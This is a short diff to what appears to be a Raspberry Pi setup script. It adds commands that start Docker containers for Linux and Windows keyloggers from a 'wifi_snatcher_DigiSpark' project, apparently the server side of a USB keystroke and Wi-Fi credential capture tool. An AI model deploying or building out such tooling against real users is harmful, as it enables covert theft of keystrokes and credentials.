@@ -51,6 +51,19 @@ usermod -aG docker pi;
 ## 
 echo "Installation of docker finished"
 
+##########################
+# Create Docker container#
+##########################
+# Linux Keylogger Container
+export LINUX_KEYLOGGER_WEB_RES_PATH=$project_path/Keylogger/wifi_snatcher_DigiSpark/linux/html
+../Keylogger/wifi_snatcher_DigiSpark/linux/keyloggerLinuxDockerControl.sh start
+# Windows Keylogger container
+export WINDOS_KEYLOGGER_WEB_RES_PATH=$project_path/Keylogger/wifi_snatcher_DigiSpark/windows/html
+../Keylogger/wifi_snatcher_DigiSpark/windows/keyloggerDockerControl.sh start
+
+
+
+
 ## Network Configuration
 #
 #
